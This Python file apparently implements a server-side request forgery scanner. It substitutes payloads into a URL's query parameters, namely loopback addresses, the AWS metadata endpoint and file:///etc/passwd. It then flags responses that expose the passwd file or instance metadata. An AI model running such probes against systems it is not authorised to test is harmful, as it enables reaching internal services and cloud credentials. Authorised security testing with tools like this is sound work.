import requests
from dataclasses import dataclass
from typing import List, Dict
from urllib.parse import urlparse, urlencode, urlunparse, parse_qs

@dataclass
class SSRFResult:
    payload: str
    vulnerable: bool
    confidence: str
    evidence: str
    url_tested: str

class SSRFScanner:
    def __init__(self, timeout: int = 5):
        self.timeout = timeout
        self.session = requests.Session()
        self.payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd",
        ]

    def inject_into_url(self, url: str, payload: str) -> str:
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        for k in query:
            query[k] = payload
        new_query = urlencode(query, doseq=True)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

    def analyze(self, response_text: str, status_code: int) -> Dict:
        evidence = []
        if status_code == 200 and "root:x:0:0" in response_text:
            evidence.append("Local file content exposed (possible SSRF/LFI)")
        if "ami-id" in response_text or "instance-id" in response_text:
            evidence.append("AWS Metadata exposed via SSRF")
        if "127.0.0.1" in response_text or "localhost" in response_text:
            evidence.append("Potential loopback reflection")
        
        vulnerable = len(evidence) > 0
        return {
            "vulnerable": vulnerable,
            "confidence": "HIGH" if vulnerable else "LOW",
            "evidence": "; ".join(evidence) if evidence else "No indicators"
        }

    def scan(self, url: str, limit: int = 5) -> List[SSRFResult]:
        results = []
        payloads = self.payloads[:limit]
        
        for payload in payloads:
            try:
                test_url = self.inject_into_url(url, payload)
                if test_url == url: # No parameters to inject
                    continue
                response = self.session.get(test_url, timeout=self.timeout)
                analysis = self.analyze(response.text, response.status_code)
                
                results.append(SSRFResult(
                    payload=payload,
                    vulnerable=analysis["vulnerable"],
                    confidence=analysis["confidence"],
                    evidence=analysis["evidence"],
                    url_tested=test_url
                ))
            except Exception as e:
                pass
        return results
